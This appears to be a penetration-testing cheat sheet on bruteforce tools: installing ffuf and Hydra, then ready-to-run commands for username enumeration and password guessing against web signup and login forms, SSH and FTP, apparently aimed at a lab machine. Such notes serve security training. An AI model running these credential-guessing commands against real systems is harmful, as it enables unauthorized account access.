# Bruteforce tools

![](https://media0.giphy.com/media/l3fzT5zFwWu4qaMwM/giphy.gif?cid=ecf05e47di3px41edfczlb6njwlgi5v14azilnbcz5dy4r9v\&rid=giphy.gif\&ct=g)

## `Ffuf`

### Installation

{% embed url="https://github.com/ffuf/ffuf" %}

{% hint style="info" %}
_<mark style="color:blue;">Make sure you have</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**go**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">version</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**1.13 or greater**</mark><mark style="color:blue;">.</mark>_
{% endhint %}

### Go | Update

```bash
# Remove the golang-go package

sudo apt-get remove golang-go

# Remove the golang-go dependencies

sudo apt-get remove --auto-remove golang-go

# Uninstall the existing Go package

sudo rm -rvf /usr/local/go

# Install the new Go version

wget https://dl.google.com/go/go1.14.linux-amd64.tar.gz

# Extract the archive file

sudo tar -xvf go1.14.linux-amd64.tar.gz

sudo mv go /usr/local

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# Reload environment variables

source ~/.profile

# Verify Go version

go version
```

### Usage

#### Usernames enumeration

```bash
ffuf -w /usr/share/wordlists/usernames.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.33/customers/signup -mr "username already exists"
```

#### Bruteforce Passwords

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/best.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.33/customers/login -fc 200
```

## `Hydra`

{% hint style="info" %}
<mark style="color:blue;">**Bruteforce**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">tool.</mark>
{% endhint %}

### Installation

```bash
# usually installed by default on kali/parrot
apt install hydra
```

### Flags

```bash
-l <user> # specifies the user
-P <path_passwd> # takes a path to a file which contains a list of password
-t <int> # specifies the number of threads used during the attack
-f # exit when a login/pass pair is found (-M: -f per host, -F global)
-s <PORT> # specifies service port
-V # verbose 
```

### Usage

#### SSH

```bash
hydra -l <user_name> -P <wordlist>.txt ssh://<ip_victim>
```

#### FTP

```bash
hydra -l user -P <wordlist>.txt ftp://<ip_victim>
```

#### WEB POST

```bash
hydra -l <username> -P <wordlist> <ip_victim> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

###
